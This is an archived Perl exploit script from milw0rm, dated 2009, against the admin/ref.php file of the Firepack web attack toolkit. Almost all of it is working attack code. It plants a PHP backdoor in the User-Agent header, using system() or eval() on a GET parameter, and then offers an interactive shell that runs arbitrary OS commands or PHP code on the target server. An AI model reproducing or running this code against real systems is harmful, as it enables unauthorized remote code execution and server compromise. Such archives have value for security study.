<html><head><title>Firepack (admin/ref.php) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
#
# Firepack - Remote Command\Code Execution Exploit
#
# Firepack is a web atting toolkit often used in 2008, when the most
# versions of it were published. A short time ago i looked though the
# sourcecode and noticed that Vulnerability which can be used
# if the admin doesn't use a .htaccess protection in his admin area.
# WARNING: When accessing the index.php, malware could be executed
# so i recommend to execute it in a virtual environment.
# Username and password are located in config.php in the main folder

print(&quot;
################################################

Firepack - Remote Command/Code Execution Exploit

Date:                        17.02.2009
Vulnerability discovered by: Lidloses_Auge
Exploit coded by:            Lidloses_Auge
Greetz to:                   -=Player=- , Suicide,
                             g4ms3, enco, Palme, GPM, 
                             karamble, Free-Hack

################################################

Use:

1) Your enemy

	URL (e.g. http://localhost/FirePack/)
	
2) Weapons

	1 = Remote Command Execution (OS Commands)
	2 = Remote Code Execution (PHP Commands)

################################################

Select the enemy now:

\t&quot;);
$enemy = &lt;STDIN&gt;;
$enemy = substr($enemy,0,length($enemy)-1);
print &quot;\nChoose your weapon!\n\n\t&quot;;
$choice = &lt;STDIN&gt;;
$choice = substr($choice,0,length($choice)-1);

if ($choice == 1 | $choice == 2) {
	print &quot;\n&gt;&gt;&gt; Entering the ship!&quot;;
	use LWP::Simple;
	use LWP::UserAgent;
	my $ua = LWP::UserAgent-&gt;new;
	$param[0] = &quot;cmd&quot;;
	$param[1] = &quot;code&quot;;
	$param[2] = &quot;system&quot;;
	$param[3] = &quot;eval&quot;;
	$code = &quot;&lt;?php if(isset(\$_GET['$param[$choice-1]'])){echo 'fp_$param[$choice-1]1';$param[$choice+1](\$_GET['$param[$choice-1]']);echo 'fp_$param[$choice-1]2';die;} ?&gt;&quot;;
	$ua-&gt;agent($code);
	$req = HTTP::Request-&gt;new(GET =&gt; $enemy.&quot;index.php&quot;);
	$req-&gt;header('Accept' =&gt; 'text/html');
	$res = $ua-&gt;request($req);
	if (!($res-&gt;is_success)) {
		print &quot;\nFailed! Wrong enemy dude?\n&quot;;
	} else {
		print &quot;\nWelcome aboard, warrior! Try some commands ('quit' to exit):&quot;;
		$splitlen = length(&quot;fp_&quot;.$param[$choice-1])+1;
		$key = &quot;fp_&quot;.$param[$choice-1];
		while (substr($cmd,0,length($cmd)-1) ne &quot;quit&quot;) {
			print &quot;\n\n&gt;Do: &quot;;
			$cmd = &lt;STDIN&gt;;
			if (substr($cmd,0,length($cmd)-1) ne &quot;quit&quot;) {
				$src = get($enemy.&quot;admin/ref.php?$param[$choice-1]=$cmd&quot;);
				print &quot;\n&quot;.substr($src,index($src,$key.&quot;1&quot;)+$splitlen,index($src,$key.&quot;2&quot;)-index($src,$key.&quot;1&quot;)-$splitlen);
			}
		}
	}
} else {
	print &quot;\nWanna fight without weapon? No way dude!&quot;;
}

# milw0rm.com [2009-02-18]</pre></html>